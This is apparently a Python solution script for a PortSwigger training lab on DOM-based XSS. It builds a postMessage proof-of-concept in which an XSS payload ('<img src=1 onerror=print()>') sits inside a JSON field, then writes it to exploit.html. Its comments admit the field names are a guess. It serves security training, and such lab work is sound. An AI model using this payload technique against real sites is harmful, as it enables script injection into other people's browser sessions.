"""
Lab 3: DOM XSS using web messages and JSON.parse
https://portswigger.net/web-security/dom-based/web-message-manipulation/lab-dom-xss-using-web-messages-and-json-parse
Difficulty: Practitioner

📝 The flaw: the handler does `JSON.parse(event.data)` — so raw HTML in the
message itself gets rejected as invalid JSON — but a FIELD inside the valid,
parsed object still flows into a dangerous sink (e.g. innerHTML). JSON.parse
only guarantees the top-level structure is legal JSON, not that its string
values are safe to use afterward.
"""

import json

from utils import get_session, log, note, fetch_page_source, grep_for_patterns, build_postmessage_poc

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("JSON.parse() is the giveaway here — it blocks raw-HTML payloads but")
    note("not a payload sitting inside one of the parsed object's fields.")
    grep_for_patterns(source, ["JSON.parse", ".innerHTML"])

    # Confirm the exact field name the sink reads (commonly something like
    # "eventType"/"data" or similar) from the real handler source.
    payload_obj = {"type": "load-chat-img", "data": {"src": "foo?x=<img src=1 onerror=print()>"}}
    message_js_literal = f"JSON.stringify({json.dumps(payload_obj)})"

    html = build_postmessage_poc(iframe_src=f"{TARGET}/", message_payload=message_js_literal)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")
    note("Field names/shape above are a starting guess — match them exactly")
    note("to what the page's own JS expects after reading its source.")


if __name__ == "__main__":
    run()
